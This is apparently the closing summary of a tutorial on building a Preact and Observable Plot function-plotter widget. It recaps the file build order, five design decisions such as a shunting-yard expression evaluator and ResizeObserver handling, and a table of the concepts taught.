If you were building this widget from scratch, the creation order matters because each file assumes the previous one exists. Start with `package.json` to lock the two runtime dependencies, then `vite.config.ts` so the `@preact/preset-vite` plugin is wired before any JSX is compiled. Write `evaluator.ts` next — it has no framework imports, so you can run it through a unit test in Node without a browser. Then add `index.html` and `main.tsx` (the three-line mount scaffolding), and finally `App.tsx`, which pulls in all of the above. Its opening three lines make the complete dependency graph legible at a glance:

```tsx
// widgets/function-plotter/src/App.tsx:1-3
import { useState, useEffect, useMemo, useRef } from 'preact/hooks';
import * as Plot from '@observablehq/plot';
import { compileExpr } from './evaluator';
```

Five decisions make the widget work. (1) Preact core over React (§ The stack and why) eliminates the synthetic event system — that is why `onInput` is required rather than `onChange` for per-keystroke updates. (2) Chaining `useMemo` to derive `fn → samples → yDomain` from a single state string (§ State and data flow) means derived values are never stored; there is no stale intermediate state and no extra render cycle — the entire state and derivation skeleton fits in 16 lines at `widgets/function-plotter/src/App.tsx:53-68`. (3) `evaluator.ts` exposes exactly one public boundary, `compileExpr(expr) → fn | null` at `widgets/function-plotter/src/evaluator.ts:191-201`, so the parsing pipeline is testable in isolation with zero framework dependencies (§ Domain logic). (4) The `z: 'seg'` channel in `Plot.line` (§ Effects and imperative integration) groups samples into separate polylines so a function like `tan(x)` near π/2 produces a gap rather than a spurious vertical spike across the asymptote. (5) A `ResizeObserver` effect with an empty dep array (§ Effects and imperative integration) observes the container's content-box width regardless of what caused the iframe viewport to change — `window.resize` would miss internal layout reflows.

For the widget's visual treatment — colour scheme, typography, and card layout — see the design track at [`../design/01-function-plotter.md`](../design/01-function-plotter.md).

## Concepts introduced

| Concept | First taught (section) |
|---|---|
| `widget.json` metadata contract | What you'll build |
| Static data mode | What you'll build |
| Preact core vs React (size, no synthetic events) | The stack and why |
| `@preact/preset-vite` Vite plugin | The stack and why |
| `preact/compat` (bridge, not used here) | The stack and why |
| Observable Plot grammar-of-graphics model | The stack and why |
| Vite native-ES-module entry (`type="module"`) | Initialisation |
| `render(vnode, container)` — Preact one-shot mount | Initialisation |
| `#widget-ready` marker convention | Initialisation |
| `useState` — source-of-truth state | Initialisation |
| `useMemo` — derived values, one render pass | State and data flow |
| Controlled input pattern | State and data flow |
| `onInput` vs `onChange` in Preact core | State and data flow |
| `useRef` declaration (DOM handle) | State and data flow |
| Tokenization | Domain logic: turning a string into f(x) |
| Shunting-yard algorithm (infix → RPN) | Domain logic: turning a string into f(x) |
| RPN stack evaluation | Domain logic: turning a string into f(x) |
| Operator precedence and right-associativity | Domain logic: turning a string into f(x) |
| Unary minus disambiguation (`__neg__`) | Domain logic: turning a string into f(x) |
| `eval`/`new Function` security risks | Domain logic: turning a string into f(x) |
| `useEffect` — timing, dep array, cleanup | Effects and imperative integration |
| `useRef` as live DOM handle (populated before effects) | Effects and imperative integration |
| `Plot.plot()` returning a live DOM node | Effects and imperative integration |
| `host.replaceChildren(node)` | Effects and imperative integration |
| `node.remove()` as effect cleanup | Effects and imperative integration |
| `ResizeObserver` + `ro.disconnect()` | Effects and imperative integration |
| `z` channel in `Plot.line` for polyline segmentation | Effects and imperative integration |
| `Number.isFinite` + magnitude cap for non-finite filtering | Effects and imperative integration |
